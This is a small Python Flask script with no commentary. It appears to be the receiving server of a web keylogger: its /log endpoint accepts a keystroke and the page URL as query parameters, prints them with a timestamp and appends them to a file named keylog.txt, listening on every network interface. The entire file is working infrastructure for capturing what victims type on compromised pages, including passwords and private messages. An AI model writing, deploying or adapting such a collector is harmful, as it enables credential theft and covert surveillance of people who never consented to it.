from flask import Flask, request
from datetime import datetime

app = Flask(__name__)


@app.route('/log')
def log_key():
    key = request.args.get('k', '')
    url = request.args.get('url', '')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    print(f"[{timestamp}] Taste: {key} | URL: {url}")

    with open('keylog.txt', 'a') as f:
        f.write(f"[{timestamp}] {url}: {key}\n")

    return '', 204


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081)
